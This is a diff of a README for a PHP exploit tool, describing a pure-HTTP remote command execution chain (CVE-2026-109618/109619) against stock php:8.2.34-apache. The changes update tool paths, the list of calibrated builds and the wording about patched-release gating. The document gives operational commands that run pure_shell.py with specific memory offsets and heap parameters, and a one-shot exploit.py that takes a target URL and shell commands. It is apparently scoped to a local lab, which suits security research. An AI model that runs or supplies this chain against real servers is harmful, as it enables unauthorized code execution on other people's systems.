@@ -4,7 +4,8 @@
 Command execution as `www-data` on stock `php:8.2.34-apache` (mod_php,
 `php.ini-production`, 128M memory limit) through the pure-HTTP
 CVE-2026-109618/109619 engine chain. 8.2.34 is the last affected release of
-the 8.2 branch; 8.2.35 is the fixed release (negative control in `lab-8235`).
+the 8.2 branch; 8.2.35 is the first fixed release and is handled by the
+driver's patched-release gate.
 
 | | |
 |---|---|
@@ -67,9 +68,9 @@ fake array landed at `S` on every run.
 
 ## Driver behavior
 
-`oneshot-8426/exploit.py` now carries `PHP/8.2` profile plus
+`oneshot/exploit.py` now carries `PHP/8.2` profile plus
 `PROFILE_FOR_BUILD = {"8.2.34": "8.2", ...}` and
-`CALIBRATED_BUILDS = {"8.2.34", "8.3.29", "8.4.26"}`. A target reporting
+`CALIBRATED_BUILDS = {"8.2.34", "8.3.29", "8.3.35", "8.4.26"}`. A target reporting
 `PHP/8.2.34` is routed straight to the 8.2 profile; other 8.2.x builds below
 8.2.35 remain `affected-uncalibrated` and are not attempted (no profile).
 
@@ -87,7 +88,7 @@ Raw chain:
 
 ```sh
 SPEC=$(python3 -c "print(','.join(['G:300:0xE2']*16+['X:900']))")
-python3 ../oneshot-8426/pure_shell.py \
+python3 ../oneshot/pure_shell.py \
   --host 127.0.0.1 --port 18134 --path /index.php --outdir ./out \
   --zif 0x39b8a0 --dtor 0x487650 --a1-progress 1000 \
   --b1-fake-len 0xC8000 --b1-spec "$SPEC" --b1-page-off 0x968 \
@@ -99,9 +100,10 @@ URL-only one-shot:
 
 ```sh
 printf 'http://127.0.0.1:18134/index.php\nid\nuname -sr\nexit\n' | \
-  P2S_OUTDIR=$PWD/out python3 ../oneshot-8426/exploit.py
+  P2S_OUTDIR=$PWD/out python3 ../oneshot/exploit.py
 ```
 
-Scope: local lab only. 8.2.34 is affected (`< 8.2.35`); 8.2.35 is the fixed
-control. Patched builds (8.2.35+, 8.3.36+, 8.4.27+, 8.5.12+) are rejected at
-preflight.
+Scope: local lab only. 8.2.34 is affected (`< 8.2.35`); 8.2.35 is the first
+fixed release. Patched builds (8.2.35+, 8.3.36+, 8.4.27+, 8.5.12+) are
+rejected at preflight by the driver gate; no dedicated fixed-build
+negative-control lab is included in this repository.
